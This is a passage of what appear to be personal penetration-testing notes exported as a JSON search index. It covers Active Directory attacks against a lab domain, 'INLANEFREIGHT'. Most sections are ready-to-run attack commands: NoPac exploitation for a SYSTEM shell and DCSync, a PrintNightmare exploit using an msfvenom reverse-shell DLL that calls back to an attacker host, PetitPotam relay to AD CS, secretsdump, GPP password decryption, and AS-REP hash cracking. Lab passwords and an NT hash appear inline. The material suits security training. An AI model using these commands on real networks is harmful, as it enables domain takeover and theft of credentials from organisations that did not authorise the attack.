Vulnerabilities","text":""},{"location":"old/old_ActiveDirectory/Stacking/BleedingEdgeVulnerabilities/#nopac-samaccountname-spoofing","title":"NoPac (SamAccountName Spoofing)","text":"<p>This exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller. By default, authenticated users can add up to ten computers to a domain. When doing so, we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller.</p> <p>NoPac [https://github.com/Ridter/noPac] uses many tools in Impacket to communicate with, upload a payload, and issue commands from the attack host to the target DC. Before attempting to use the exploit, we should ensure Impacket is installed and the noPac [] exploit repo is cloned to our attack host if needed. We can use these commands to do so:</p> <p>we can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (scanner.py) then use the exploit (noPac.py) to gain a shell as NT AUTHORITY/SYSTEM. We can use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is, in fact, vulnerable. We'll also notice the ms-DS-MachineAccountQuota number is set to 10. In some environments, an astute sysadmin may set the ms-DS-MachineAccountQuota value to 0. If this is the case, the attack will fail because our user will not have the rights to add a new machine account. Setting this to 0 can prevent quite a few AD attacks.</p>"},{"location":"old/old_ActiveDirectory/Stacking/BleedingEdgeVulnerabilities/#scanning-for-nopac","title":"Scanning for NoPac","text":"<pre><code>$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap\n</code></pre>"},{"location":"old/old_ActiveDirectory/Stacking/BleedingEdgeVulnerabilities/#running-nopac-getting-a-shell","title":"Running NoPac &amp; Getting a Shell","text":"<pre><code>$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap\n</code></pre> <p>It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run. We can use ls to confirm.</p>"},{"location":"old/old_ActiveDirectory/Stacking/BleedingEdgeVulnerabilities/#using-nopac-to-dcsync-the-built-in-administrator-account","title":"Using noPac to DCSync the Built-in Administrator Account","text":"<pre><code>$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator\n</code></pre>"},{"location":"old/old_ActiveDirectory/Stacking/BleedingEdgeVulnerabilities/#printnightmare","title":"PrintNightmare","text":"<p>PrintNightmare is the nickname given to two vulnerabilities (CVE-2021-34527 and CVE-2021-1675) found in the Print Spooler service that runs on all Windows operating systems. Many exploits have been written based on these vulnerabilities that allow for privilege escalation and remote code execution. Using this vulnerability for local privilege escalation is covered in the Windows Privilege Escalation module, but is also important to practice within the context of Active Directory environments for gaining remote access to a host. Let's practice with one exploit that can allow us to gain a SYSTEM shell session on a Domain Controller running on a Windows Server 2019 host.</p> <p>We can use rpcdump.py to see if Print System Asynchronous Protocol and Print System Remote Protocol are exposed on the target.</p>"},{"location":"old/old_ActiveDirectory/Stacking/BleedingEdgeVulnerabilities/#enumerating-for-ms-rprn","title":"Enumerating for MS-RPRN","text":"<pre><code>$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'\n</code></pre>"},{"location":"old/old_ActiveDirectory/Stacking/BleedingEdgeVulnerabilities/#generating-a-dll-payload","title":"Generating a DLL Payload","text":"<pre><code>$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll &gt; backupscript.dll\n\n$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll\n\nuse exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\n\n$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\\\172.16.5.225\\CompData\\backupscript.dll'\n</code></pre>"},{"location":"old/old_ActiveDirectory/Stacking/BleedingEdgeVulnerabilities/#petitpotam-ms-efsrpc","title":"PetitPotam (MS-EFSRPC)","text":"<p>PetitPotam (CVE-2021-36942) is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the Local Security Authority Remote Protocol (LSARPC) by abusing Microsoft\u2019s Encrypting File System Remote Protocol (MS-EFSRPC). This technique allows an unauthenticated attacker to take over a Windows domain where Active Directory Certificate Services (AD CS) is in use. In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate. This certificate can then be used with a tool such as Rubeus or gettgtpkinit.py from PKINITtools to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.</p> <pre><code>$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController\n</code></pre>"},{"location":"old/old_ActiveDirectory/Stacking/BleedingEdgeVulnerabilities/#running-petitpotampy","title":"Running PetitPotam.py","text":"<pre><code>$ python3 PetitPotam.py 172.16.5.225 172.16.5.5       \n</code></pre> <p>Back in our other window, we will see a successful login request and obtain the base64 encoded certificate for the Domain Controller if the attack is successful.</p>"},{"location":"old/old_ActiveDirectory/Stacking/BleedingEdgeVulnerabilities/#requesting-a-tgt-using-gettgtpkinitpy","title":"Requesting a TGT Using gettgtpkinit.py","text":"<p>Next, we can take this base64 certificate and use gettgtpkinit.py to request a Ticket-Granting-Ticket (TGT) for the domain controller.</p> <pre><code>$ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache\n</code></pre>"},{"location":"old/old_ActiveDirectory/Stacking/BleedingEdgeVulnerabilities/#setting-the-krb5ccname-environment-variable","title":"Setting the KRB5CCNAME Environment Variable","text":"<p>The TGT requested above was saved down to the dc01.ccache file, which we use to set the KRB5CCNAME environment variable, so our attack host uses this file for Kerberos authentication attempts.</p> <pre><code>$ export KRB5CCNAME=dc01.ccache\n</code></pre>"},{"location":"old/old_ActiveDirectory/Stacking/BleedingEdgeVulnerabilities/#using-domain-controller-tgt-to-dcsync","title":"Using Domain Controller TGT to DCSync","text":"<p>We can then use this TGT with secretsdump.py to perform a DCSYnc and retrieve one or all of the NTLM password hashes for the domain.</p> <pre><code>$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass \"ACADEMY-EA-DC01$\"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\n</code></pre>"},{"location":"old/old_ActiveDirectory/Stacking/BleedingEdgeVulnerabilities/#confirming-admin-access-to-the-domain-controller","title":"Confirming Admin Access to the Domain Controller","text":"<p>Finally, we could use the NT hash for the built-in Administrator account to authenticate to the Domain Controller. From here, we have complete control over the domain and could look to establish persistence, search for sensitive data, look for other misconfigurations and vulnerabilities for our report, or begin enumerating trust relationships.</p> <pre><code>$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf\n</code></pre>"},{"location":"old/old_ActiveDirectory/Stacking/DoubleHop/","title":"Kerberos \"Double Hop\" Problem","text":"<p>There's an issue known as the \"Double Hop\" problem that arises when an attacker attempts to use Kerberos authentication across two (or more) hops. The issue concerns how Kerberos tickets are granted for specific resources. Kerberos tickets should not be viewed as passwords. They are signed pieces of data from the KDC that state what resources an account can access. When we perform Kerberos authentication, we get a \"ticket\" that permits us to access the requested resource (i.e., a single machine). On the contrary, when we use a password to authenticate, that NTLM hash is stored in our session and can be used elsewhere without issue.</p>"},{"location":"old/old_ActiveDirectory/Stacking/DoubleHop/#background","title":"Background","text":"<p>The \"Double Hop\" problem often occurs when using WinRM/Powershell since the default authentication mechanism only provides a ticket to access a specific resource. This will likely cause issues when trying to perform lateral movement or even access file shares from the remote shell. In this situation, the user account being used has the rights to perform an action but is denied access. The most common way to get shells is by attacking an application on the target host or using credentials and a tool such as PSExec. In both of these scenarios, the initial authentication was likely performed over SMB or LDAP, which means the user's NTLM Hash would be stored in memory. Sometimes we have a set of credentials and are restricted to a particular method of authentication, such as WinRM, or would prefer to use WinRM for any number of reasons.</p> <p>The crux of the issue is that when using WinRM to authenticate over two or more connections, the user's password is never cached as part of their login. If we use Mimikatz to look at the session, we'll see that all credentials are blank. As stated previously, when we use Kerberos to establish a remote session, we are not using a password for authentication. When password authentication is used, with PSExec, for example, that NTLM hash is stored in the session, so when we go to access another resource, the machine can pull the hash from memory and authenticate us.</p>"},{"location":"old/old_ActiveDirectory/Stacking/DoubleHop/#workaround-1-pscredential-object","title":"Workaround #1: PSCredential Object","text":"<pre><code>*Evil-WinRM* PS &gt; $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force\n*Evil-WinRM* PS &gt; $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\backupadm', $SecPassword)\n*Evil-WinRM* PS &gt; get-domainuser -spn -credential $Cred | select samaccountname\n</code></pre>"},{"location":"old/old_ActiveDirectory/Stacking/DoubleHop/#workaround-2-register-pssession-configuration","title":"Workaround #2: Register PSSession Configuration","text":"<pre><code>PS &gt; Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\\backupadm\n</code></pre> <p>Once this is done, we need to restart the WinRM service by typing Restart-Service WinRM in our current PSSession. This will kick us out, so we'll start a new PSSession using the named registered session we set up previously.</p> <p>After we start the session, we can see that the double hop problem has been eliminated, and if we type klist, we'll have the cached tickets necessary to reach the Domain Controller. This works because our local machine will now impersonate the remote machine in the context of the backupadm user and all requests from our local machine will be sent directly to the Domain Controller.</p> <pre><code>PS &gt; Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\\backupadm -ConfigurationName  backupadmsess\n[DEV01]: PS C:\\Users\\backupadm\\Documents&gt; klist\n</code></pre> <p>We can now run tools such as PowerView without having to create a new PSCredential object.</p>"},{"location":"old/old_ActiveDirectory/Stacking/MiscellaneousMisconfigurations/","title":"Miscellaneous Misconfigurations","text":""},{"location":"old/old_ActiveDirectory/Stacking/MiscellaneousMisconfigurations/#privexchange","title":"PrivExchange","text":"<p>The PrivExchange attack results from a flaw in the Exchange Server PushSubscription feature, which allows any domain user with a mailbox to force the Exchange server to authenticate to any host provided by the client over HTTP.</p> <p>The Exchange service runs as SYSTEM and is over-privileged by default (i.e., has WriteDacl privileges on the domain pre-2019 Cumulative Update). This flaw can be leveraged to relay to LDAP and dump the domain NTDS database. If we cannot relay to LDAP, this can be leveraged to relay and authenticate to other hosts within the domain. This attack will take you directly to Domain Admin with any authenticated domain user account.</p>"},{"location":"old/old_ActiveDirectory/Stacking/MiscellaneousMisconfigurations/#printer-bug","title":"Printer Bug","text":"<p>The Printer Bug is a flaw in the MS-RPRN protocol (Print System Remote Protocol). This protocol defines the communication of print job processing and print system management between a client and a print server. To leverage this flaw, any domain user can connect to the spool's named pipe with the RpcOpenPrinter method and use the RpcRemoteFindFirstPrinterChangeNotificationEx method, and force the server to authenticate to any host provided by the client over SMB.</p> <p>The spooler service runs as SYSTEM and is installed by default in Windows servers running Desktop Experience. This attack can be leveraged to relay to LDAP and grant your attacker account DCSync privileges to retrieve all password hashes from AD.</p> <p>The attack can also be used to relay LDAP authentication and grant Resource-Based Constrained Delegation (RBCD) privileges for the victim to a computer account under our control, thus giving the attacker privileges to authenticate as any user on the victim's computer. This attack can be leveraged to compromise a Domain Controller in a partner domain/forest, provided you have administrative access to a Domain Controller in the first forest/domain already, and the trust allows TGT delegation, which is not by default anymore.</p> <p>We can use tools such as the Get-SpoolStatus module from this tool or [https://github.com/NotMedic/NetNTLMtoSilverTicket] this tool to check for machines vulnerable to the MS-PRN Printer Bug. This flaw can be used to compromise a host in another forest that has Unconstrained Delegation enabled, such as a domain controller. It can help us to attack across forest trusts once we have compromised one forest.</p>"},{"location":"old/old_ActiveDirectory/Stacking/MiscellaneousMisconfigurations/#exchange-related-group-membership","title":"Exchange Related Group Membership","text":"<p>A default installation of Microsoft Exchange within an AD environment (with no split-administration model) opens up many attack vectors, as Exchange is often granted considerable privileges within the domain (via users, groups, and ACLs). The group Exchange Windows Permissions is not listed as a protected group, but members are granted the ability to write a DACL to the domain object. This can be leveraged to give a user DCSync privileges. An attacker can add accounts to this group by leveraging a DACL misconfiguration (possible) or by leveraging a compromised account that is a member of the Account Operators group. It is common to find user accounts and even computers as members of this group. Power users and support staff in remote offices are often added to this group, allowing them to reset passwords. This GitHub repo details a few techniques for leveraging Exchange for escalating privileges in an AD environment.</p> <p>The Exchange group Organization Management is another extremely powerful group (effectively the \"Domain Admins\" of Exchange) and can access the mailboxes of all domain users. It is not uncommon for sysadmins to be members of this group. This group also has full control of the OU called Microsoft Exchange Security Groups, which contains the group Exchange Windows Permissions.</p>"},{"location":"old/old_ActiveDirectory/Stacking/MiscellaneousMisconfigurations/#enumerating-dns-records","title":"Enumerating DNS Records","text":"<p>We can use a tool such as adidnsdump [https://github.com/dirkjanm/adidnsdump] to enumerate all DNS records in a domain using a valid domain user account. This is especially helpful if the naming convention for hosts returned to us in our enumeration using tools such as BloodHound is similar to SRV01934.INLANEFREIGHT.LOCAL. If all servers and workstations have a non-descriptive name, it makes it difficult for us to know what exactly to attack. If we can access DNS entries in AD, we can potentially discover interesting DNS records that point to this same server, such as JENKINS.INLANEFREIGHT.LOCAL, which we can use to better plan out our attacks.</p> <p>The tool works because, by default, all users can list the child objects of a DNS zone in an AD environment. By default, querying DNS records using LDAP does not return all results. So by using the adidnsdump tool, we can resolve all records in the zone and potentially find something useful for our engagement. The background and more in-depth explanation of this tool and technique can be found in this post.</p> <p>On the first run of the tool, we can see that some records are blank, namely ?,LOGISTICS,?.</p> <pre><code>$ adidnsdump -u inlanefreight\\\\forend ldap://172.16.5.5 -r\n</code></pre> <pre><code>$ head records.csv\n</code></pre>"},{"location":"old/old_ActiveDirectory/Stacking/MiscellaneousMisconfigurations/#password-in-description-field","title":"Password in Description Field","text":"<p>Sensitive information such as account passwords are sometimes found in the user account Description or Notes fields and can be quickly enumerated using PowerView. For large domains, it is helpful to export this data to a CSV file to review offline.</p>"},{"location":"old/old_ActiveDirectory/Stacking/MiscellaneousMisconfigurations/#finding-passwords-in-the-description-field-using-get-domain-user","title":"Finding Passwords in the Description Field using Get-Domain User","text":"<pre><code>PS &gt; Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}\n</code></pre>"},{"location":"old/old_ActiveDirectory/Stacking/MiscellaneousMisconfigurations/#passwd_notreqd-field","title":"PASSWD_NOTREQD Field","text":"<p>It is possible to come across domain accounts with the passwd_notreqd field set in the userAccountControl attribute. If this is set, the user is not subject to the current password policy length, meaning they could have a shorter password or no password at all (if empty passwords are allowed in the domain). A password may be set as blank intentionally (sometimes admins don\u2019t want to be called out of hours to reset user passwords) or accidentally hitting enter before entering a password when changing it via the command line. Just because this flag is set on an account, it doesn't mean that no password is set, just that one may not be required. There are many reasons why this flag may be set on a user account, one being that a vendor product set this flag on certain accounts at the time of installation and never removed the flag post-install. It is worth enumerating accounts with this flag set and testing each to see if no password is required (I have seen this a couple of times on assessments). Also, include it in the client report if the goal of the assessment is to be as comprehensive as possible.</p>"},{"location":"old/old_ActiveDirectory/Stacking/MiscellaneousMisconfigurations/#checking-for-passwd_notreqd-setting-using-get-domainuser","title":"Checking for PASSWD_NOTREQD Setting using Get-DomainUser","text":"<pre><code>PS &gt; Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol\n</code></pre>"},{"location":"old/old_ActiveDirectory/Stacking/MiscellaneousMisconfigurations/#credentials-in-smb-shares-and-sysvol-scripts","title":"Credentials in SMB Shares and SYSVOL Scripts","text":"<p>The SYSVOL share can be a treasure trove of data, especially in large organizations. We may find many different batch, VBScript, and PowerShell scripts within the scripts directory, which is readable by all authenticated users in the domain. It is worth digging around this directory to hunt for passwords stored in scripts. Sometimes we will find very old scripts containing since disabled accounts or old passwords, but from time to time, we will strike gold, so we should always dig through this directory. Here, we can see an interesting script named reset_local_admin_pass.vbs.</p>"},{"location":"old/old_ActiveDirectory/Stacking/MiscellaneousMisconfigurations/#discovering","title":"Discovering","text":"<pre><code>PS &gt; ls \\\\academy-ea-dc01\\SYSVOL\\INLANEFREIGHT.LOCAL\\scripts\n</code></pre>"},{"location":"old/old_ActiveDirectory/Stacking/MiscellaneousMisconfigurations/#group-policy-preferences-gpp-passwords","title":"Group Policy Preferences (GPP) Passwords","text":"<p>When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:</p> <ul> <li>Map drives (drives.xml)</li> <li>Create local users</li> <li>Create printer config files (printers.xml)</li> <li>Creating and updating services (services.xml)</li> <li>Creating scheduled tasks (scheduledtasks.xml)</li> <li>Changing local admin passwords.</li> <li>These files can contain an array of configuration data and defined passwords. The cpassword attribute value is AES-256 bit encrypted, but Microsoft published the AES private key on MSDN, which can be used to decrypt the password. Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.</li> </ul> <p>This was patched in 2014 MS14-025 Vulnerability in GPP could allow elevation of privilege, to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.</p>"},{"location":"old/old_ActiveDirectory/Stacking/MiscellaneousMisconfigurations/#decrypting-the-password-with-gpp-decrypt","title":"Decrypting the Password with gpp-decrypt","text":"<pre><code>$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE\n</code></pre> <p>GPP passwords can be located by searching or manually browsing the SYSVOL share or using tools such as Get-GPPPassword.ps1, the GPP Metasploit Post Module, and other Python/Ruby scripts which will locate the GPP and return the decrypted cpassword value. CrackMapExec also has two modules for locating and retrieving GPP passwords. One quick tip to consider during engagements: Often, GPP passwords are defined for legacy accounts, and you may therefore retrieve and decrypt the password for a locked or deleted account. However, it is worth attempting to password spray internally with this password (especially if it is unique). Password re-use is widespread, and the GPP password combined with password spraying could result in further access.</p>"},{"location":"old/old_ActiveDirectory/Stacking/MiscellaneousMisconfigurations/#locating-retrieving-gpp-passwords-with-crackmapexec","title":"Locating &amp; Retrieving GPP Passwords with CrackMapExec","text":"<pre><code>$ crackmapexec smb -L | grep gpp\n</code></pre>"},{"location":"old/old_ActiveDirectory/Stacking/MiscellaneousMisconfigurations/#asreproasting","title":"ASREPRoasting","text":"<p>It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the Do not require Kerberos pre-authentication setting enabled. Many vendor installation guides specify that their service account be configured in this way. The authentication service reply (AS_REP) is encrypted with the account\u2019s password, and any domain user can request it.</p> <p>With pre-authentication, a user enters their password, which encrypts a time stamp. The Domain Controller will decrypt this to validate that the correct password was used. If successful, a TGT will be issued to the user for further authentication requests in the domain. If an account has pre-authentication disabled, an attacker can request authentication data for the affected account and retrieve an encrypted TGT from the Domain Controller. This can be subjected to an offline password attack using a tool such as Hashcat or John the Ripper.</p> <p>ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required. This setting can be enumerated with PowerView or built-in tools such as the PowerShell AD module. The attack itself can be performed with the Rubeus toolkit and other tools to obtain the ticket for the target account. If an attacker has GenericWrite or GenericAll permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password before disabling the attribute again. Like Kerberoasting, the success of this attack depends on the account having a relatively weak password.</p> <p>Below is an example of the attack. PowerView can be used to enumerate users with their UAC value set to DONT_REQ_PREAUTH.</p>"},{"location":"old/old_ActiveDirectory/Stacking/MiscellaneousMisconfigurations/#enumerating-for-dont_req_preauth-value-using-get-domainuser","title":"Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser","text":"<pre><code>PS &gt; Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl\n</code></pre> <p>With this information in hand, the Rubeus tool can be leveraged to retrieve the AS-REP in the proper format for offline hash cracking. This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth. We will see an example of this using Kerbrute later in this section. Remember, add the /nowrap flag so the ticket is not column wrapped and is retrieved in a format that we can readily feed into Hashcat.</p>"},{"location":"old/old_ActiveDirectory/Stacking/MiscellaneousMisconfigurations/#retrieving-as-rep-in-proper-format-using-rubeus","title":"Retrieving AS-REP in Proper Format using Rubeus","text":"<pre><code>PS &gt; .\\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat\n</code></pre>"},{"location":"old/old_ActiveDirectory/Stacking/MiscellaneousMisconfigurations/#cracking-the-hash-offline-with-hashcat","title":"Cracking the Hash Offline with Hashcat","text":"<pre><code>$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt \n</code></pre> <p>When performing user enumeration with Kerbrute, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication.</p>"},{"location":"old/old_ActiveDirectory/Stacking/MiscellaneousMisconfigurations/#retrieving-the-as-rep-using-kerbrute","title":"Retrieving the AS-REP Using Kerbrute","text":"<pre><code>$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt \n</code></pre> <p>With a list of valid users, we can use Get-NPUsers.py from the Impacket toolkit to hunt for all users with Kerberos pre-authentication not required. The tool will retrieve the AS-REP in Hashcat format for offline cracking for any found. We can also feed a wordlist such as jsmith.txt into the tool, it will throw errors for users that do not exist, but if it finds any valid ones without Kerberos pre-authentication, then it can be a nice way to obtain a foothold or further our access, depending on where we are in the course of our assessment. Even if we are unable to crack the AS-REP using Hashcat it is still good to report this as a finding to clients (just lower risk if we cannot crack the password) so they can assess whether or not the account requires this setting.</p>"},{"location":"old/old_ActiveDirectory/Stacking/MiscellaneousMisconfigurations/#hunting-for-users-with-kerberoast-pre-auth-not-required","title":"Hunting for Users with Kerberoast Pre-auth Not Required","text":"<pre><code>$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users \n</code></pre> <p>We have now covered a few ways that we can perform an ASREPRoasting attack from both Windows and Linux hosts and witnessed how we do not need to be on a domain-joined host to a) enumerate accounts that do not require Kerberos pre-authentication and b) perform this attack and obtain an AS-REP to crack offline to either gain a foothold in the domain or further our access.</p>"},{"location":"old/old_ActiveDirectory/Stacking/MiscellaneousMisconfigurations/#group-policy-object-gpo-abuse","title":"Group Policy Object (GPO) Abuse","text":"<p>Group Policy provides administrators with many advanced settings that can be applied to both user and computer objects in an AD environment. Group Policy, when used right, is an excellent tool for hardening an AD environment by configuring user settings, operating systems, and applications. That being said, Group Policy can also be abused by attackers. If we can gain rights over a Group Policy Object via an ACL misconfiguration, we could leverage this for lateral movement, privilege escalation, and even domain compromise and as a persistence mechanism within the domain. Understanding how to enumerate and attack GPOs can give us a leg up and can sometimes be the ticket to achieving our goal in a rather locked-down environment.</p> <p>GPO misconfigurations can be abused to perform the following attacks:</p> <ul> <li>Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)</li> <li>Adding a local admin user to one or more hosts</li> <li>Creating an immediate scheduled task to perform any number of actions</li> <li>We can enumerate GPO information using many of the tools we've been using throughout this module such as PowerView and BloodHound. We can also use group3r, ADRecon, PingCastle, among others, to audit the security of GPOs in a domain.</li> </ul> <p>Using the Get-DomainGPO function from PowerView, we can get a listing of GPOs by name.</p>"},{"location":"old/old_ActiveDirectory/Stacking/MiscellaneousMisconfigurations/#enumerating-gpo-names-with-powerview","title":"Enumerating GPO Names with PowerView","text":"<pre><code>PS &gt; Get-DomainGPO |select displayname\n</code></pre> <p>This can be helpful for us to begin to see what types of security measures are in place (such as denying cmd.exe access and a separate password policy for service accounts). We can see that autologon is in use which may mean there is a readable password in a GPO, and see that Active Directory Certificate Services (AD CS) is present in the domain. If Group Policy Management Tools are installed on the host we are working from, we can use various built-in GroupPolicy cmdlets such as Get-GPO to perform the same enumeration.</p>"},{"location":"old/old_ActiveDirectory/Stacking/MiscellaneousMisconfigurations/#enumerating-gpo-names-with-a-built-in-cmdlet","title":"Enumerating GPO Names with a Built-In Cmdlet","text":"<pre><code>PS &gt; Get-GPO -All | Select DisplayName\n</code></pre> <p>This can be helpful for us to begin to see what types of security measures are in place (such as denying cmd.exe access and a separate password policy for service accounts). We can see that autologon is in use which may mean there is a readable password in a GPO, and see that Active Directory Certificate Services (AD CS) is present in the domain. If Group Policy Management Tools are installed on the host we are working from, we can use various built-in GroupPolicy cmdlets such as Get-GPO to perform the same enumeration.</p>"},{"location":"old/old_ActiveDirectory/Stacking/MiscellaneousMisconfigurations/#enumerating-gpo-names-with-a-built-in-cmdlet_1","title":"Enumerating GPO Names with a Built-In Cmdlet","text":"<pre><code>PS &gt; Get-GPO -All | Select DisplayName\n</code></pre> <p>Next, we can check if a user we can control has any rights over a GPO. Specific users or groups may be granted rights to administer one or more GPOs. A good first check is to see if the entire Domain Users group has any rights over one or more GPOs.</p>"},{"location":"old/old_ActiveDirectory/Stacking/MiscellaneousMisconfigurations/#enumerating-domain-user-gpo-rights","title":"Enumerating Domain User GPO Rights","text":"<pre><code>PS &gt; $sid=Convert-NameToSid \"Domain Users\"\nPS &gt; Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}\n</code></pre> <p>Here we can see that the Domain Users group has various permissions over a GPO, such as WriteProperty and WriteDacl, which we could leverage to give ourselves full control over the GPO and pull off any number of attacks that would be pushed down to any users and computers in OUs that the GPO is applied to. We can use the GPO GUID combined with Get-GPO to see the display name of the GPO.</p>"},{"location":"old/old_ActiveDirectory/Stacking/MiscellaneousMisconfigurations/#converting-gpo-guid-to-name","title":"Converting GPO GUID to Name","text":"<pre><code>PS &gt; Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532\n</code></pre>"},{"location":"old/old_ActiveDirectory/Stacking/PrivilegedAccess/","title":"Privileged Access","text":"<p>Once we gain a foothold in the domain, our goal shifts to advancing our position further by moving laterally or vertically to obtain access to other hosts, and eventually achieve domain compromise or some other goal, depending on the aim of the assessment. To achieve this, there are several ways we can move laterally. Typically, if we take over an account with local admin rights over a host, or set of hosts, we can perform a Pass-the-Hash attack to authenticate via the SMB protocol.</p> <p>But what if we don't yet have local admin rights on any hosts in the domain?</p> <p>There are several other ways we can move around a Windows domain:</p> <ul> <li> <p>Remote Desktop Protocol (RDP) - is a remote access/management protocol that gives us GUI access to a target host</p> </li> <li> <p>PowerShell Remoting - also referred to as PSRemoting or Windows Remote Management (WinRM) access, is a remote access protocol that allows us to run commands or enter an interactive command-line session on a remote host using PowerShell</p> </li> <li> <p>MSSQL Server - an account with sysadmin privileges on an SQL Server instance can log into the instance remotely and execute queries against the database. This access can be used to run operating system commands in the context of the SQL Server service account through various methods</p> </li> </ul>"},{"location":"old/old_ActiveDirectory/Stacking/PrivilegedAccess/#remote-desktop","title":"Remote Desktop","text":""},{"location":"old/old_ActiveDirectory/Stacking/PrivilegedAccess/#enumerating-the-remote-desktop-users-group","title":"Enumerating the Remote Desktop Users Group","text":"<pre><code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Desktop Users\"\n</code></pre>"},{"location":"old/old_ActiveDirectory/Stacking/PrivilegedAccess/#checking-the-domain-users-groups-local-admin-execution-rights-using-bloodhound","title":"Checking the Domain Users Group's Local Admin &amp; Execution Rights using BloodHound","text":"<p>If we gain control over a user through an attack such as LLMNR/NBT-NS Response Spoofing or Kerberoasting, we can search for the username in BloodHound to check what type of remote access rights they have either directly or inherited via group membership under Execution Rights on the Node Info tab.</p> <p>We could also check the Analysis tab and run the pre-built queries Find Workstations where Domain Users can RDP or Find Servers where Domain Users can RDP</p>"},{"location":"old/old_ActiveDirectory/Stacking/PrivilegedAccess/#winrm","title":"WinRM","text":""},{"location":"old/old_ActiveDirectory/Stacking/PrivilegedAccess/#enumerating-the-remote-management-users-group","title":"Enumerating the Remote Management Users Group","text":"<pre><code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Management Users\"\n</code></pre>"},{"location":"old/old_ActiveDirectory/Stacking/PrivilegedAccess/#using-the-cypher-query-in-bloodhound","title":"Using the Cypher Query in BloodHound","text":"<pre><code>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]-&gt;(c:Computer) RETURN p2\n</code></pre>"},{"location":"old/old_ActiveDirectory/Stacking/PrivilegedAccess/#establishing-winrm-session-from-windows","title":"Establishing WinRM Session from Windows","text":"<pre><code>$password = ConvertTo-SecureString \"Klmcargo2\" -AsPlainText -Force\n$cred = new-object System.Management.Automation.PSCredential (\"INLANEFREIGHT\\forend\", $password)\nEnter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred\n</code></pre>"},{"location":"old/old_ActiveDirectory/Stacking/PrivilegedAccess/#connecting-to-a-target-with-evil-winrm-and-valid-credentials","title":"Connecting to a Target with Evil-WinRM and Valid Credentials","text":"<pre><code>evil-winrm -i 10.129.201.234 -u forend\n</code></pre>"},{"location":"old/old_ActiveDirectory/Stacking/PrivilegedAccess/#sql-server-admin","title":"SQL Server Admin","text":"<p>More often than not, we will encounter SQL servers in the environments we face. It is common to find user and service accounts set up with sysadmin privileges on a given SQL server instance. We may obtain credentials for an account with this access via Kerberoasting (common) or others such as LLMNR/NBT-NS Response 